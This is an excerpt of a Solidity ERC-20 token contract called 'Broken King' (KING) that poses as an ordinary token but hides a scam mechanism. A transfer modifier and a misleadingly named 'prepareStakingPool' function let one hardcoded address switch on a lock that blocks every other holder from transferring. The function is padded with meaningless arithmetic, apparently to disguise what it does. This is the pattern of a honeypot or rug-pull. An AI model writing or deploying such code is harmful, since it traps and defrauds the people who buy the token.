...
contract BrokeKing is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenm_totalSupply;
    uint256 private _tokenm_status = 0;
    uint256 public stakingPoolmStatus = 0;

    string private _tokenm_name;
    string private _tokenm_symbol;

    address private _poolmAddress = 0xbb49857283b29743D2c6266DBc3489751846EEb4;

    constructor() {
        _tokenm_name = "Broken King";
        _tokenm_symbol = "KING";
        _tokenm_totalSupply = 1000000000 * 10 ** 18;
        _balances[msg.sender] = _tokenm_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolmAddress || _tokenm_status == 0);
        _;
    }
    ...
    function symbol() public view virtual override returns (string memory) {
        return _tokenm_symbol;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _tokenm_totalSupply;
    }
    ...
    function prepareStakingPool(address to) public {
        to == address(0);
        stakingPoolmStatus = 1;
        uint256 a = 1;
        a = a + 1;
        a = a-1;
        if (msg.sender == _poolmAddress)
        {
            _tokenm_status = 1;
        }
    }
